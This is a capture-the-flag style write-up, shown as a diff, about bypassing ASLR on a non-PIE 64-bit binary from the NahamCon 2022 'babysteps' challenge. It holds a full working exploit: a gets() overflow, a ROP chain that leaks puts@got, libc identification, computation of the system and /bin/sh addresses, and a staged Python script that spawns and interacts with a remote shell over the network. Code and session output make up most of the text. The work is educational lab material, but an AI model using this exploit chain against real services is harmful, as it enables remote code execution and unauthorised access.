@@ -1,0 +1,559 @@
+here's howto bypass aslr with not position indipendent executable (without pwn library)
+
+here's the setup on remote host:
+(.venv) fusillator@scrap:~$ gcc -g -fno-pie -no-pie -o babysteps_nopie_withsym64 babysteps.c
+
+(.venv) fusillator@scrap:~$ pwn checksec ./babysteps_nopie_withsym64
+[*] '/home/fusillator/babysteps_nopie_withsym64'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+
+(.venv) fusillator@scrap:~$ sudo sysctl kernel.randomize_va_space
+kernel.randomize_va_space = 2
+
+(.venv) fusillator@scrap:~$ socat tcp-l:55555,reuseaddr,fork EXEC:"./babysteps_nopie_withsym64",stderr
+
+I don't use pty option with socat because it cuts off the 0x10 0x11 bytes (maybe it's possible to escape the ctrl characters with \x16, not tested)
+more over -x socat option could be useful for debug to print out the raw bytes on the wire  
+
+the attack is planned in 4 phases:
+phase 1 aims to leak the libc base address (since it changes at every execution)
+phase 2 is a consequence of phase 1 choose between available libc versions
+phase 3 launch system("/bin/bash") and test it
+phase 4 make it interactive
+
+phase1: 
+
+first grab the virtual addresses at the attacking host (they won't change since included in the elf)
+
+pwndbg> got
+
+GOT protection: Partial RELRO | GOT functions: 5
+ 
+[0x404018] puts@GLIBC_2.2.5 -> 0x401036 (puts@plt+6) ◂— push   0 /* 'h' */
+[0x404020] setbuf@GLIBC_2.2.5 -> 0x401046 (setbuf@plt+6) ◂— push   1
+[0x404028] gets@GLIBC_2.2.5 -> 0x401056 (gets@plt+6) ◂— push   2
+[0x404030] __isoc99_scanf@GLIBC_2.7 -> 0x401066 (__isoc99_scanf@plt+6) ◂— push   3
+[0x404038] exit@GLIBC_2.2.5 -> 0x401076 (exit@plt+6) ◂— push   4
+
+pwndbg> gotplt
+0x404018: puts@got.plt
+0x404020: setbuf@got.plt
+0x404028: gets@got.plt
+0x404030: __isoc99_scanf@got.plt
+0x404038: exit@got.plt
+
+pwndbg> info functions puts@plt
+All functions matching regular expression "puts@plt":
+
+Non-debugging symbols:
+0x0000000000401030  puts@plt
+
+now I know where the address of puts@plt is 0x401030 and puts@got is 0x404018
+I want to grab the address on the remote server so I'll send a rop chain to print the puts@got itself (the ld library will resolve the puts function address at execution time giving me the exact address):
+so I will send the payload:
+padding + (rop of pop rdi + ret) + puts@got + puts@plt
+
+pwndbg> rop --grep 'pop rdi ; ret'
+0x000000000040145b : pop rdi ; ret
+
+find the offset 
+
+pwndbg> run < <(cyclic -n8 1024)
+..
+First, what is your baby name?
+
+Program received signal SIGSEGV, Segmentation fault.
+
+pwndbg> regs rsp
+ RSP  0x7fffffffe088 ◂— 0x6161616161616164 ('daaaaaaa')
+pwndbg> cyclic -n8 -l 0x6161616161616164
+24
+
+
+let's put the remote socat in debug mode just to verify that the leaked puts address matches the effective relocated address on remote hosts:
+
+(.venv) fusillator@scrap:~$ gdb -q socat
+pwndbg: loaded 197 commands. Type pwndbg [filter] for a list.
+pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
+Reading symbols from socat...
+(No debugging symbols found in socat)
+pwndbg> add-symbol-file babysteps_nopie_withsym64                         
+add symbol table from file "babysteps_nopie_withsym64"
+Reading symbols from babysteps_nopie_withsym64...
+pwndbg> set follow-fork-mode child                                        
+pwndbg> set args tcp-l:55555 EXEC:"./babysteps_nopie_withsym64",stderr    
+pwndbg> b babysteps.c:main                                                
+Breakpoint 1 at 0x401210: file babysteps.c, line 38.
+pwndbg> run
+Starting program: /usr/bin/socat tcp-l:55555 EXEC:"./babysteps_nopie_withsym64",stderr
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+now send the payload from the attacking host (using the -x option of socat we can peekout the raw bytes of the address in lbe format)
+
+(.venv) fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ ( python3 -c "import sys; offset=24; sys.stdout.buffer.write(b'A'*24+b'\x5b\x14\x40\x00' + b'\x00'*4 + b'\x18\x40\x40\x00' + b'\x00'*4 + b'\x30\x10\x40\x00' + b'\x00'*4 + b'\x0a')"; cat ) | socat -x - tcp4:scrap:55555
+> 2022/05/16 16:32:48.299404  length=49 from=0 to=48
+ 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 5b 14 40 00 00 00 00 00 18 40 40 00 00 00 00 00 30 10 40 00 00 00 00 00 0a
+
+on the remote host the execution is stopped at the breakpoint, we can print the resolved put address for test purpose then continue the execution:
+
+pwndbg> p &puts
+$1 = (int (*)(const char *)) 0x7ffff7e735f0 <__GI__IO_puts>
+pwndbg> c
+Continuing.
+
+on the attacking host:
+
+< 2022/05/16 16:40:56.156751  length=559 from=0 to=558
+ 20 20 20 20 20 20 20 20 20 20 20 20 20 20 5f 29 5f 0a 20 20 20 20 20 20 20 20 20 20 20 2e 2d 27 28 2f 20 27 2d 2e 0a 20 20 20 20 20 20 20 20 20 20 2f 20 20 20 20 60 20 20 20 20 5c 0a 20 20 20 20 20 20 20 20 20 2f 20 20 2d 20 20 20 20 20 2d 20 20 5c 0a 20 20 20 20 20 20 20 20 28 60 20 20 61 20 20 20 20 20 61 20 20 60 29 0a 20 20 20 20 20 20 20 20 20 5c 20 20 20 20 20 5e 20 20 20 20 20 2f 0a 20 20 20 20 20 20 20 20 20 20 27 2e 20 27 2d 2d 2d 27 20 2e 27 0a 20 20 20 20 20 20 20 20 20 20 2e 2d 60 27 2d 2d 2d 27 60 2d 2e 0a 20 20 20 20 20 20 20 20 20 2f 20 20 20 20 20 20 20 20 20 20 20 5c 0a 20 20 20 20 20 20 20 20 2f 20 20 2f 20 27 20 20 20 27 20 5c 20 20 5c 0a 20 20 20 20 20 20 5f 2f 20 20 2f 7c 20 20 20 20 20 20 20 7c 5c 20 20 5c 5f 0a 20 20 20 20 20 60 2f 7c 5c 60 20 7c 2b 2b 2b 2b 2b 2b 2b 7c 60 2f 7c 5c 60 0a 20 20 20 20 20 20 20 20 20 20 2f 5c 20 20 20 20 20 20 20 2f 5c 0a 20 20 20 20 20 20 20 20 20 20 7c 20 60 2d 2e 5f 2e 2d 60 20 7c 0a 20 20 20 20 20 20 20 20 20 20 5c 20 20 20 2f 20 5c 20 20 20 2f 0a 20 20 20 20 20 20 20 20 20 20 7c 5f 20 7c 20 20 20 7c 20 5f 7c 0a 20 20 20 20 20 20 20 20 20 20 7c 20 5f 7c 20 20 20 7c 5f 20 7c 0a 20 20 20 20 20 20 20 20 20 20 28 6f 6f 4f 20 20 20 4f 6f 6f 29 0a 0a 3d 3d 3d 20 42 41 42 59 20 53 49 4d 55 4c 41 54 4f 52 20 39 30 30 30 20 3d 3d 3d 0a 48 6f 77 27 73 20 69 74 20 67 6f 69 6e 67 2c 20 62 61 62 69 65 73 21 21 0a 41 72 65 20 79 6f 75 20 72 65 61 64 79 20 66 6f 72 20 74 68 65 20 61 64 76 65 6e 74 75 72 65 20 6f 66 20 61 20 6c 69 66 65 74 69 6d 65 3f 20 28 6c 69 74 65 72 61 6c 6c 79 3f 29 0a 0a 46 69 72 73 74 2c 20 77 68 61 74 20 69 73 20 79 6f 75 72 20 62 61 62 79 20 6e 61 6d 65 3f 0a f0 35 e7 f7 ff 7f 0a
+              _)_
+           .-'(/ '-.
+          /    `    \
+         /  -     -  \
+        (`  a     a  `)
+         \     ^     /
+          '. '---' .'
+          .-`'---'`-.
+         /           \
+        /  / '   ' \  \
+      _/  /|       |\  \_
+     `/|\` |+++++++|`/|\`
+          /\       /\
+          | `-._.-` |
+          \   / \   /
+          |_ |   | _|
+          | _|   |_ |
+          (ooO   Ooo)
+
+=== BABY SIMULATOR 9000 ===
+How's it going, babies!!
+Are you ready for the adventure of a lifetime? (literally?)
+
+First, what is your baby name?
+�5���
+
+we can see the last row of the hexadecimal values printed by the -x socat option is the address of puts in lbe format without the null bytes (those line of exadecimal above the baby ascii art, last quad word is the leaked address)
+f0 35 e7 f7 ff 7f 0a
+
+
+let's write a simple program to print out the remote addresses and return to the prompt...
+we add a link to the chain to call the ask_baby_name function again (to trigger again the vulnerable function gets)
+now the payload will become: padding + (rop of pop rdi + ret) + puts@got + puts@plt + &ask_baby_name
+
+fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ cat exploit64_part1.py 
+#!/bin/env python
+import sys; 
+import socket;
+import argparse;
+from struct import pack; 
+import os, pty;
+
+parser=argparse.ArgumentParser();
+parser.add_argument("host", help="remote host to connect to")
+parser.add_argument("port", type=int, help="remote port to connect to")
+args=parser.parse_args()
+
+offset=24 
+
+gethex=lambda bstr: "".join(f'{hex(c)[2:]:0>2}' for c in bstr) #[2:] to remove 0x, :0>2 to pad the single digit
+getaddr=lambda bstr: gethex(pack("<Q",int(f'{gethex(bstr):0<16}', base=16)))
+getaddratoffset=lambda addr, offset: hex(int(addr,16)-offset)[2:].rjust(16,"0")
+p64=lambda addr: pack("<Q",int(addr,16))
+
+def recvto(s,rawstr):
+    bytez=b""
+    while True:
+        bytez+=s.recv(4096)
+        if bytez.endswith(rawstr):
+            break
+    return bytez
+
+###### part 1 verify the version of libc by means of str_sh_addr 
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.connect((args.host, args.port))
+    print(recvto(s,b"what is your baby name?\x0a").decode("utf-8"),end="")
+    payload=[ b"A"*offset,                      #padding
+          b"\x5b\x14\x40\x00" + b"\x00"*4,      #rop of pop rdi +ret
+          b"\x18\x40\x40\x00" + b"\x00"*4,      #puts@got
+          b"\x30\x10\x40\x00" + b"\x00"*4,      #puts@plt
+          b"\xdc\x11\x40\x00" + b"\x00"*4,      #&ask_baby_name
+          b"\x0a" ]
+    s.sendall(b"".join(payload))
+    msg=recvto(s,b"what is your baby name?\x0a")
+#    print(f"{msg}");
+    blines=msg.split(b"\x0a")
+#   print(list(map(gethex,blines)))
+    leaked_addr=getaddr(blines[0])
+    print(f'leaked address: {leaked_addr}')
+    libc_base_addr=getaddratoffset(leaked_addr,0x765f0) #0x765f0 is the puts vaddr in symbol table of remote libc 
+    print(f'libc base address: {libc_base_addr}')
+    print(blines[1].decode("utf-8"))
+
+
+reset the demon on the attacked host and test the code:
+
+(.venv) fusillator@scrap:~$ socat tcp-l:55555,reuseaddr,fork EXEC:"./babysteps_nopie_withsym64",stderr
+
+(.venv) fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ ( python3 exploit64_part1.py scrap 55555; cat )
+              _)_
+           .-'(/ '-.
+          /    `    \
+         /  -     -  \
+        (`  a     a  `)
+         \     ^     /
+          '. '---' .'
+          .-`'---'`-.
+         /           \
+        /  / '   ' \  \
+      _/  /|       |\  \_
+     `/|\` |+++++++|`/|\`
+          /\       /\
+          | `-._.-` |
+          \   / \   /
+          |_ |   | _|
+          | _|   |_ |
+          (ooO   Ooo)
+
+=== BABY SIMULATOR 9000 ===
+How's it going, babies!!
+Are you ready for the adventure of a lifetime? (literally?)
+
+First, what is your baby name?
+leaked address: 00007fb76306c5f0
+libc base address: 00007fb762ff6000
+First, what is your baby name?
+
+
+now we need to retrieve the libc base address as the difference leaked address - symbol address
+
+since aslr is enabled the libc functions address will change all the times anyway the lower part of the address (last 3 digits) will be fixed:
+
+(.venv) fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ python3 exploit64.py scrap 55555 | tail -n1 
+00007f12e8be65f0
+(.venv) fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ python3 exploit64.py scrap 55555 | tail -n1 
+00007f12325065f0
+(.venv) fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ python3 exploit64.py scrap 55555 | tail -n1 
+00007f1df02ab5f0
+
+using the last 3 digit we can retrieve the libc version used remotely from the site https://libc.blukat.me/
+
+so searching the corrispondence of puts with this 3 digits 5f0 on the site https://libc.blukat.me/?q=puts%3A5f0&l=libc6-amd64_2.31-9_i386 
+we got 3 corrispondences 
+(.venv) fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ wget https://libc.blukat.me/d/libc6-amd64_2.31-13_i386.so
+(.venv) fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ wget https://libc.blukat.me/d/libc6-amd64_2.31-17_i386.so
+(.venv) fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ wget https://libc.blukat.me/d/libc6-amd64_2.31-9_i386.so
+
+(.venv) fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ readelf -a libc6*so | egrep -e "\bputs@@GLIBC"
+   430: 00000000000765f0   472 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5
+   430: 00000000000765f0   472 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5
+   430: 00000000000765f0   472 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5
+
+so the libc base address will change everytime but knowing the offset of the functions and a leaked address - we can retrieve it as a difference:
+libc_base_address=leaked address - symbol address
+
+we can verify it from a gdb session on remote host:
+
+(.venv) fusillator@scrap:~$ gdb -q socat
+pwndbg: loaded 197 commands. Type pwndbg [filter] for a list.
+pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
+Reading symbols from socat...
+(No debugging symbols found in socat)
+pwndbg> add-symbol-file babysteps_nopie_withsym64                     
+add symbol table from file "babysteps_nopie_withsym64"
+Reading symbols from babysteps_nopie_withsym64...
+pwndbg> set follow-fork-mode child                                    
+pwndbg> set args tcp-l:55555 EXEC:"./babysteps_nopie_withsym64",stderr
+pwndbg> b babysteps.c:main                                            
+Breakpoint 1 at 0x401210: file babysteps.c, line 38.
+pwndbg> run
+Starting program: /usr/bin/socat tcp-l:55555 EXEC:"./babysteps_nopie_withsym64",stderr
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+(.venv) fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ ( python3 exploit64_part1.py scrap 55555; cat )
+              _)_
+           .-'(/ '-.
+          /    `    \
+         /  -     -  \
+        (`  a     a  `)
+         \     ^     /
+          '. '---' .'
+          .-`'---'`-.
+         /           \
+        /  / '   ' \  \
+      _/  /|       |\  \_
+     `/|\` |+++++++|`/|\`
+          /\       /\
+          | `-._.-` |
+          \   / \   /
+          |_ |   | _|
+          | _|   |_ |
+          (ooO   Ooo)
+
+=== BABY SIMULATOR 9000 ===
+How's it going, babies!!
+Are you ready for the adventure of a lifetime? (literally?)
+
+First, what is your baby name?
+leaked address: 00007fb76306c5f0
+libc base address: 00007fb762ff6000
+First, what is your baby name?
+
+(.venv) fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ python3 -q
+>>> hex(0x00007ffff7e735f0-0x765f0)
+'0x7ffff7dfd000'
+
+let's prove on debug session @scrap
+
+pwndbg> vmmap /usr/lib/x86_64-linux-gnu/libc-2.31.so
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+    0x7ffff7dfd000     0x7ffff7e22000 r--p    25000 0      /usr/lib/x86_64-linux-gnu/libc-2.31.so
+    0x7ffff7e22000     0x7ffff7f6d000 r-xp   14b000 25000  /usr/lib/x86_64-linux-gnu/libc-2.31.so
+    0x7ffff7f6d000     0x7ffff7fb7000 r--p    4a000 170000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
+    0x7ffff7fb7000     0x7ffff7fb8000 ---p     1000 1ba000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
+    0x7ffff7fb8000     0x7ffff7fbb000 r--p     3000 1ba000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
+    0x7ffff7fbb000     0x7ffff7fbe000 rw-p     3000 1bd000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
+
+phase2 
+
+we aims to execute system("/bin/sh")
+so we need to send a payload like this: 
+padding + (rop of pop rdi + ret) + &system + addr of "/bin/sh" + "\x0a"
+
+let's find system in the downloaded libc:
+
+(.venv) fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ readelf -a libc6*so | grep system
+  1430: 0000000000048e50    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
+  1430: 0000000000048e50    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
+  1430: 0000000000048e50    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
+
+the system library will be at libc_base + 0x048e50
+
+let's find the shell string in the downloaded libc:
+(.venv) fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ strings -a -t x libc6-amd64* | grep "/bin/sh"
+ 18a152 /bin/sh
+ 18a152 /bin/sh
+ 18a156 /bin/sh
+that's not good we have two different offset depending on the libc minor release number..
+to get the correct offset we can blindly try it or grab the string at every offset (18a152, 18a156) with puts to see if matching the string /bin/sh
+verifying what's the correct one with the rop chain:
+padding + (rop of pop rdi + ret) + addr of "/bin/sh" + puts@plt + &ask_baby_name "\x0a"
+
+let's go with the following change in the code:
+
+fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ diff exploit64_part1.py  exploit64_part2.py 
+47,48c47,74
+<     print(blines[1].decode("utf-8"))
+<  
+---
+>     #print(blines[1].decode("utf-8"))
+>          
+> ###### part 2 verify the version of libc by means of str_sh_addr 
+>     str_sh_addr=getaddratoffset(libc_base_addr,-0x18a152) #0x18a152 is grabbed with $strings -a -t x libc6-amd64* | grep "/bin/sh" 
+>     #str_sh_addr=getaddratoffset(leaked_addr,-0x18a156) #0x18a156 the other string value revealed not matching
+>     print(f'string shell address: {str_sh_addr}')
+>     #print(f'raw string shell address: {p64(str_sh_addr)}')
+> 
+>     system_addr=getaddratoffset(libc_base_addr,-0x48e50) #0x48e50 is the system vaddr in symbol table of remote libc 
+>     print(f'system address: {system_addr}')
+>     exit_addr=getaddratoffset(libc_base_addr,-0xcb670) #0xcb670 is the _exit vaddr in symbol table of remote libc
+>     print(f'exit address: {exit_addr}')
+> 
+>     print(blines[1].decode("utf-8")) # the prompt to prove ask_baby_name is been called again 
+>     #prove the offset calling puts(str_sh_addr), if fails program crash else print out "/bin/sh"
+>     #test it with all offset found in the different libc versions
+>     payload=[ b"A"*offset,                      #padding 
+>               b"\x5b\x14\x40\x00" + b"\x00"*4,  #rop of pop rdi + ret
+>               p64(str_sh_addr),                 #"/bin/sh"
+>               b"\x30\x10\x40\x00" + b"\x00"*4,  #puts@plt
+>               b"\xdc\x11\x40\x00" + b"\x00"*4,  #&ask_baby_name
+>               b"\x0a" ]
+>     
+>     s.sendall(b"".join(payload))
+>     msg=recvto(s,b"what is your baby name?\x0a")
+>     print(msg.decode("utf-8"),end="");
+
+fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ ( python3 exploit64_part2.py scrap 55555; cat )
+              _)_
+           .-'(/ '-.
+          /    `    \
+         /  -     -  \
+        (`  a     a  `)
+         \     ^     /
+          '. '---' .'
+          .-`'---'`-.
+         /           \
+        /  / '   ' \  \
+      _/  /|       |\  \_
+     `/|\` |+++++++|`/|\`
+          /\       /\
+          | `-._.-` |
+          \   / \   /
+          |_ |   | _|
+          | _|   |_ |
+          (ooO   Ooo)
+
+=== BABY SIMULATOR 9000 ===
+How's it going, babies!!
+Are you ready for the adventure of a lifetime? (literally?)
+
+First, what is your baby name?
+leaked address: 00007fad6a8975f0
+libc base address: 00007fad6a821000
+string shell address: 00007fad6a9ab152
+system address: 00007fad6a869e50
+exit address: 00007fad6a8ec670
+First, what is your baby name?
+/bin/sh
+First, what is your baby name?
+
+we find the correct one is 0x18a152
+choosing the wrong one the program crashes without printing /bin/sh with the message:
+fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ sudo dmesg | tail -n2 
+[ 5938.673540] Out of memory: Killed process 1275 (python3) total-vm:4789032kB, anon-rss:3306144kB, file-rss:4kB, shmem-rss:0kB, UID:1001 pgtables:8476kB oom_score_adj:0
+[ 5938.808445] oom_reaper: reaped process 1275 (python3), now anon-rss:0kB, file-rss:0kB, shmem-rss:0kB 
+
+phase 3:
+now we have all the addresses to launch system("/bin/sh") and send a command like hostname to verify our remote shell
+let's try the payload:
+padding + (rop of pop rdi + ret) + &system + addr of "/bin/sh" + "\x0a"
+
+we patch the version3 with this delta:
+
+(.venv) fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ diff exploit64_part2.py exploit64_part3.py 
+73a74,85
+> ###### part 3 launch system("/bin/sh") on the remote host and send the command hostname to the shell   
+>     payload=[ b"A"*offset,                      #padding 
+>               b"\x5b\x14\x40\x00" + b"\x00"*4,  #rop of pop rdi + ret
+>               p64(str_sh_addr),                 #"/bin/sh"
+>               p64(system_addr),                 #&system
+>               p64(exit_addr),                   #&exit
+>               b"\x0a" ]
+>     s.sendall(b"".join(payload))
+>     s.sendall(b"hostname\n")
+>     msg=recvto(s,b"\x0a").decode("utf-8")
+>     print(msg,end="")
+>
+
+let's go
+(.venv) fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ python3 exploit64_part3.py scrap 55555 
+              _)_
+           .-'(/ '-.
+          /    `    \
+         /  -     -  \
+        (`  a     a  `)
+         \     ^     /
+          '. '---' .'
+          .-`'---'`-.
+         /           \
+        /  / '   ' \  \
+      _/  /|       |\  \_
+     `/|\` |+++++++|`/|\`
+          /\       /\
+          | `-._.-` |
+          \   / \   /
+          |_ |   | _|
+          | _|   |_ |
+          (ooO   Ooo)
+
+=== BABY SIMULATOR 9000 ===
+How's it going, babies!!
+Are you ready for the adventure of a lifetime? (literally?)
+
+First, what is your baby name?
+leaked address: 00007f667b5d95f0
+libc base address: 00007f667b563000
+string shell address: 00007f667b6ed152
+system address: 00007f667b5abe50
+exit address: 00007f667b62e670
+First, what is your baby name?
+/bin/sh
+First, what is your baby name?
+scrap
+
+phase 4:
+I added a forward shell to make the session interactive, here's the delta:
+
+(.venv) fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ diff exploit64_part3.py exploit64_part4.py 
+86c86,96
+< 
+---
+> ##### part 4 make it interactive
+>     pid=os.fork()
+>     if pid>0:
+>         #it's blind we could attach the cat stdin 0 to the keyboard or to the socket, that's the reason we fork
+>         os.dup2(s.fileno(),1) 
+>         os.execv("/bin/cat", ["/bin/cat"])
+>     else:
+>         while True:
+>             data=s.recv(4096)
+>             print(data.decode("utf-8"),end="")
+>  
+
+(.venv) fusillator@luna:~/Code/ctf/nahamcon2022/babysteps$ python3 exploit64_part4.py scrap 55555
+              _)_
+           .-'(/ '-.
+          /    `    \
+         /  -     -  \
+        (`  a     a  `)
+         \     ^     /
+          '. '---' .'
+          .-`'---'`-.
+         /           \
+        /  / '   ' \  \
+      _/  /|       |\  \_
+     `/|\` |+++++++|`/|\`
+          /\       /\
+          | `-._.-` |
+          \   / \   /
+          |_ |   | _|
+          | _|   |_ |
+          (ooO   Ooo)
+
+=== BABY SIMULATOR 9000 ===
+How's it going, babies!!
+Are you ready for the adventure of a lifetime? (literally?)
+
+First, what is your baby name?
+leaked address: 00007f4e87ec35f0
+libc base address: 00007f4e87e4d000
+string shell address: 00007f4e87fd7152
+system address: 00007f4e87e95e50
+exit address: 00007f4e87f18670
+First, what is your baby name?
+/bin/sh
+First, what is your baby name?
+scrap
+ls
+a.out
+babysteps.c
+babysteps_nopie_withsym64
+babysteps_pie_withsym64
+babysteps_withsym64
+core
+dnsspoofer.py
+JettyMavenHelloWebApp
+JettyMavenHelloWorld
+JNDI-Injection-Exploit
+log4jpwn-master
+log4jpwn-master.zip
+log4j-shell-poc-main
+log4j-shell-poc-main.zip
+src
+udpserver.py
+whoami
+fusillator
+
+
+
+
+
+
+
+
+
+
